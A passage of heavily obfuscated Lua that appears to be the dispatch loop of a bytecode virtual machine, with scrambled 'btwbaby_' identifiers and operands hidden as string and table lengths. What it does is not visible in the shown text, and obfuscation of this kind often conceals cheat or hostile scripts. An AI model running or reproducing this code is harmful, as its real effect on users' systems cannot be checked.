111";{477;470;228;917};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("usk")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z3")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{51;578;344;120};{122;865;122;570};{564;656;824;728};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1t")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rJy")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("qR8")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9f")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("77a")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aOQM")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ych")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("05")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y1y")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{932;666;963;488};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L4")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MWS")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7l")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5NB")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ga")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("F6u")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mA1")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("gC")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("9Vf")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Aj")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("6kC")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nmi8")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xn")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HWU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lAn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("hsIv")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ms")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sux")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4BSC")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ws")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("1dq")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("V8x4")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hy")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("pZS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("RydS")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YP")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{308;589;423;287};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mC")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("l1U")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("eush")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{789;679;278;92};"1 + 1 = 111";{111;168;932;364};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9S")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("u0X")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{833;97;58;961};{145;461;507;988};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("3j7")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xo")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{{430;221;779;917};{632;279;36;428};"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dvy")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sguj")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hg")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ECE")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jg2u")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aU")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CBo")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tT")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HWg")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("YJ2y")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sq")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PjD")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("K5nW")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zr")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("M5k")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("C0TC")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jn")],btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{572;399;659;187};}]do btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=nil;end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bk")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2Nr")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XF")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yx4")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hs")];btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("EYK")]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_lIIIlIIIIllllIlIllllI;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_lIIIlIIIIllllIlIllllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ojAl")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("L9")]btwbaby_llIlIIIl,btwbaby_llIIIlIlllll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_llIIIlIlllll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_lllIllIIlIlIlIllIIIIIIIII=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_lllIllIIlIlIlIllIIIIIIIII=btwbaby_lllIllIIlIlIlIllIIIIIIIII+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIlIIIl[btwbaby_lllIllIIlIlIlIllIIIIIIIII];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{767;895;60;193};}]btwbaby_llIlIIIl={btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))};btwbaby_lllIllIIlIlIlIllIIIIIIIII=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_IllIIIllIlIIIIIlIIIllII[#("WaA4")]do btwbaby_lllIllIIlIlIlIllIIIIIIIII=btwbaby_lllIllIIlIlIlIllIIIIIIIII+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIlIIIl[btwbaby_lllIllIIlIlIlIllIIIIIIIII];end btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jM9")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("0YkqlcIhOsuu9nWQEy9R3AUAYAD")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("AXxAaLKJrGmhcoIE34bmvzf0Y")then if btwbaby_IIlIllIIlIlIIlIIIl>#("aAeVCVJJR064uyNny8k2OO2p")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BR")]]={};else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fm")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LsM")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("YfJm")]];end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("3zqNbSGMSKjFHdCJDIRI9KNJha")then local btwbaby_lIIlIlIIlIlIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y3")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cNz")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Lr")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Map")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ofb9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3e")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kxQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("0N")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Syn")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yt")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jRg")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("hGPs")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eD")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("2qZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ES")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nv")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KiF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mz")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{30;6;961;696};"1 + 1 = 111";"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("jgGZ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oO")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("FNd")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{864;422;585;983};"1 + 1 = 111";}]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ql")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oS5")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hO")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gWO")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{45;858;613;61};"1 + 1 = 111";{453;611;728;735};{642;829;34;547};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZV")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hmL")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ca")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MM")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ykU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7B")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mCo")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{413;488;725;386};{965;351;411;146};{24;510;372;976};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("YI8")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("27")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3Q")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fpk")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9L")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("6T1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yi8q")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("au")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{876;571;102;574};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("aI")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z6")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("VSd")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lP")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{235;209;235;436};{6;548;942;782};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Exbg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("HTM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("lL")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nq")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GFU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qS")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 